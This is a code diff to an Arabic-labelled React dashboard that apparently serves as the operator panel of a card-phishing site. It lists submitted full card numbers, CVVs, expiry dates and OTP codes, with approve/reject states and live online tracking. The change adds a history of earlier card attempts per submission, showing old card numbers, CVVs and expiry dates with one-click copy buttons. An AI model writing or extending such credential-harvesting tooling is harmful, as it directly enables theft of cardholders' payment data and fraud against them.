@@ -30,6 +30,7 @@ interface Submission {
   onlineStatus?: 'online' | 'offline'
   lastSeenAt?: number
   cardStateHistory?: CardStateHistoryEntry[]
+  cardDetailsHistory?: CardAttemptHistoryEntry[]
 }
 
 type CardStateValue = 'pending' | 'approved' | 'rejected'
@@ -38,6 +39,15 @@ type CardStateHistoryEntry = {
   state: CardStateValue
   at?: number
   by?: string
+}
+
+type CardAttemptHistoryEntry = {
+  cardNumber?: string
+  CVC?: string
+  dateMonth?: string
+  datayaer?: string
+  cardExpiry?: string
+  submittedAt?: number
 }
 
 const PAGE_LABELS: Record<string, string> = {
@@ -126,9 +136,49 @@ function getCardStateHistory(sub: Submission): CardStateHistoryEntry[] {
   return []
 }
 
+function formatAttemptExpiry(entry: CardAttemptHistoryEntry) {
+  if (entry.dateMonth && entry.datayaer) return `${entry.dateMonth}/${entry.datayaer}`
+  if (entry.cardExpiry) {
+    const [year, month] = entry.cardExpiry.split('-')
+    if (month && year) return `${month}/${year.slice(-2)}`
+  }
+  return '—'
+}
+
+function getCardAttemptHistory(sub: Submission): CardAttemptHistoryEntry[] {
+  const rawAttempts = Array.isArray(sub.cardDetailsHistory) ? sub.cardDetailsHistory : []
+  const normalized = rawAttempts
+    .filter((entry): entry is CardAttemptHistoryEntry => !!entry && !!entry.cardNumber)
+    .map((entry) => ({
+      cardNumber: (entry.cardNumber ?? '').replace(/\D/g, ''),
+      CVC: entry.CVC ?? '',
+      dateMonth: entry.dateMonth ?? '',
+      datayaer: entry.datayaer ?? '',
+      cardExpiry: entry.cardExpiry ?? '',
+      submittedAt: typeof entry.submittedAt === 'number' ? entry.submittedAt : sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+    }))
+    .sort((a, b) => (b.submittedAt ?? 0) - (a.submittedAt ?? 0))
+
+  if (normalized.length > 0) return normalized
+
+  if (sub.cardNumber || sub.CVC || sub.dateMonth || sub.datayaer) {
+    return [{
+      cardNumber: (sub.cardNumber ?? '').replace(/\D/g, ''),
+      CVC: sub.CVC ?? '',
+      dateMonth: sub.dateMonth ?? '',
+      datayaer: sub.datayaer ?? '',
+      cardExpiry: '',
+      submittedAt: sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+    }]
+  }
+
+  return []
+}
+
 function buildNotificationSignature(sub: Submission) {
   const otpCount = Array.isArray(sub.otpArr) ? sub.otpArr.filter(Boolean).length : 0
   const historyCount = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory.length : 0
+  const cardAttemptsCount = Array.isArray(sub.cardDetailsHistory) ? sub.cardDetailsHistory.length : 0
   return [
     sub.cardState ?? 'pending',
     sub.step ?? '-',
@@ -136,6 +186,7 @@ function buildNotificationSignature(sub: Submission) {
     sub.onlineStatus ?? '-',
     otpCount,
     historyCount,
+    cardAttemptsCount,
   ].join('|')
 }
 
@@ -384,18 +435,19 @@ export default function Dashboard() {
     rejected: submissions.filter(s => s.cardState === 'rejected').length,
   }
 
-  const rejectedCardHistory = useMemo(
+  const oldCardDetailsHistory = useMemo(
     () => submissions
-      .flatMap((sub) => (
-        getCardStateHistory(sub)
-          .filter(entry => entry.state === 'rejected')
-          .map(entry => ({
-            id: sub.id,
-            at: entry.at ?? sub.stateUpdatedAt ?? sub.createdAt,
-            by: entry.by,
-          }))
-      ))
-      .sort((a, b) => (b.at ?? 0) - (a.at ?? 0)),
+      .flatMap((sub) => {
+        const attempts = getCardAttemptHistory(sub)
+        return attempts.slice(1).map((attempt) => ({
+          id: sub.id,
+          cardNumber: attempt.cardNumber ?? '',
+          CVC: attempt.CVC ?? '',
+          expiry: formatAttemptExpiry(attempt),
+          submittedAt: attempt.submittedAt,
+        }))
+      })
+      .sort((a, b) => (b.submittedAt ?? 0) - (a.submittedAt ?? 0)),
     [submissions],
   )
 
@@ -469,33 +521,40 @@ export default function Dashboard() {
           ))}
         </div>
 
-        {!dataLoading && rejectedCardHistory.length > 0 && (
+        {!dataLoading && oldCardDetailsHistory.length > 0 && (
           <Card className="border-0 shadow-sm bg-white">
             <CardHeader className="pb-3">
-              <CardTitle className="text-base">سجل البطاقات المرفوضة (حسب رقم الهوية)</CardTitle>
+              <CardTitle className="text-base">سجل البطاقات القديمة (رقم البطاقة / CVV / الانتهاء)</CardTitle>
             </CardHeader>
             <CardContent>
-              <div className="space-y-2 max-h-60 overflow-auto pr-1">
-                {rejectedCardHistory.map((entry, i) => (
-                  <div key={`${entry.id}-${entry.at ?? 'na'}-${i}`} className="flex flex-col sm:flex-row sm:items-center justify-between gap-1 rounded-lg border border-red-100 bg-red-50/50 px-3 py-2">
+              <div className="space-y-2 max-h-72 overflow-auto pr-1">
+                {oldCardDetailsHistory.map((entry, i) => (
+                  <div key={`${entry.id}-${entry.submittedAt ?? 'na'}-${i}`} className="rounded-lg border border-slate-200 bg-slate-50 px-3 py-2 space-y-1.5">
                     <div className="text-sm text-gray-700">
                       رقم الهوية: <span className="font-mono font-semibold">{entry.id}</span>
                     </div>
-                    <div className="text-xs text-gray-500 flex items-center gap-2">
-                      <span>
-                        {formatArabicDateTime(entry.at)}
-                      </span>
-                      {entry.by && <span className="text-gray-400">({entry.by})</span>}
-                      <button
-                        type="button"
-                        onClick={() => void deleteSubmission(entry.id)}
-                        disabled={deleting === entry.id}
-                        className="inline-flex items-center gap-1 rounded-md border border-red-200 bg-white px-2 py-1 text-red-600 hover:bg-red-50 disabled:cursor-not-allowed disabled:opacity-60"
-                        title="حذف الطلب"
-                      >
-                        {deleting === entry.id ? <RefreshCw className="w-3 h-3 animate-spin" /> : <Trash2 className="w-3 h-3" />}
-                        <span>حذف</span>
-                      </button>
+                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs">
+                      <div className="rounded-md border border-gray-200 bg-white px-2 py-1.5">
+                        <div className="text-gray-400 mb-0.5">رقم البطاقة</div>
+                        <div className="font-mono text-gray-800 flex items-center">
+                          {formatCardDisplay(entry.cardNumber)}
+                          {entry.cardNumber && <CopyButton text={entry.cardNumber} />}
+                        </div>
+                      </div>
+                      <div className="rounded-md border border-gray-200 bg-white px-2 py-1.5">
+                        <div className="text-gray-400 mb-0.5">CVV</div>
+                        <div className="font-mono text-gray-800 flex items-center">
+                          {entry.CVC || '—'}
+                          {entry.CVC && <CopyButton text={entry.CVC} />}
+                        </div>
+                      </div>
+                      <div className="rounded-md border border-gray-200 bg-white px-2 py-1.5">
+                        <div className="text-gray-400 mb-0.5">تاريخ الانتهاء</div>
+                        <div className="font-mono text-gray-800">{entry.expiry}</div>
+                      </div>
+                    </div>
+                    <div className="text-xs text-gray-500">
+                      {formatArabicDateTime(entry.submittedAt)}
                     </div>
                   </div>
                 ))}
@@ -524,6 +583,7 @@ export default function Dashboard() {
               const online = isSubmissionOnline(sub, presenceNow)
               const stepLabel = resolveStepLabel(sub.step, sub.currentPage)
               const stateHistory = getCardStateHistory(sub)
+              const oldCardAttempts = getCardAttemptHistory(sub).slice(1)
               const fullCard = (sub.cardNumber || '').replace(/\D/g, '')
               const groupedCard = fullCard.replace(/(.{4})/g, '$1 ').trim()
 
@@ -597,6 +657,44 @@ export default function Dashboard() {
                             <InfoRow label="CVV" value={sub.CVC} mono copyable />
                           </div>
                         </div>
+
+                        {oldCardAttempts.length > 0 && (
+                          <div>
+                            <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
+                              <Clock className="w-3.5 h-3.5" /> البطاقات القديمة
+                            </h3>
+                            <div className="bg-gray-50 rounded-xl p-4 border border-gray-100 space-y-2">
+                              {oldCardAttempts.map((attempt, index) => {
+                                const oldCardNumber = (attempt.cardNumber ?? '').replace(/\D/g, '')
+                                return (
+                                  <div key={`${oldCardNumber}-${attempt.submittedAt ?? 'na'}-${index}`} className="rounded-lg border border-gray-200 bg-white px-3 py-2 space-y-1.5">
+                                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs">
+                                      <div>
+                                        <div className="text-gray-400 mb-0.5">رقم البطاقة</div>
+                                        <div className="font-mono text-gray-800 flex items-center">
+                                          {formatCardDisplay(oldCardNumber)}
+                                          {oldCardNumber && <CopyButton text={oldCardNumber} />}
+                                        </div>
+                                      </div>
+                                      <div>
+                                        <div className="text-gray-400 mb-0.5">CVV</div>
+                                        <div className="font-mono text-gray-800 flex items-center">
+                                          {attempt.CVC || '—'}
+                                          {attempt.CVC && <CopyButton text={attempt.CVC} />}
+                                        </div>
+                                      </div>
+                                      <div>
+                                        <div className="text-gray-400 mb-0.5">تاريخ الانتهاء</div>
+                                        <div className="font-mono text-gray-800">{formatAttemptExpiry(attempt)}</div>
+                                      </div>
+                                    </div>
+                                    <div className="text-xs text-gray-500">{formatArabicDateTime(attempt.submittedAt)}</div>
+                                  </div>
+                                )
+                              })}
+                            </div>
+                          </div>
+                        )}
 
                         {sub.otpArr && sub.otpArr.filter(Boolean).length > 0 && (
                           <div>
